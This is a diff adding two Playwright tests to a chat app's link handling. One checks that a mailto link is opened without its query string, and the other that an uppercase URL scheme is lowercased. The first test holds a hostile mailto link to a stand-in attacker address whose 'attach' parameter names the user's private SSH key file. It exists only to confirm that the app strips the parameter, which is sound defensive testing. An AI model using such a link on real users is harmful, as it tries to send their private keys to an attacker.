@@ -139,3 +139,17 @@ test("an honest link opens straight away", async ({ page }) => {
   await page.getByRole("link", { name: "example.com" }).click();
   await expect.poll(() => openedLinks(page)).toEqual(["https://www.example.com/guide"]);
 });
+
+test("a mail link opens without its query, which could ask the mail app to attach files", async ({ page }) => {
+  await recordOpenedLinks(page);
+  await send(page, "general", "Write to [x@evil.example](mailto:x@evil.example?attach=~/.ssh/id_rsa&subject=hi)");
+  await page.getByRole("link", { name: "x@evil.example" }).click();
+  await expect.poll(() => openedLinks(page)).toEqual(["mailto:x@evil.example"]);
+});
+
+test("a link with an uppercase scheme still opens, with the scheme lowercased", async ({ page }) => {
+  await recordOpenedLinks(page);
+  await send(page, "general", "See [the guide](HTTPS://Example.com/Guide)");
+  await page.getByRole("link", { name: "the guide" }).click();
+  await expect.poll(() => openedLinks(page)).toEqual(["https://Example.com/Guide"]);
+});
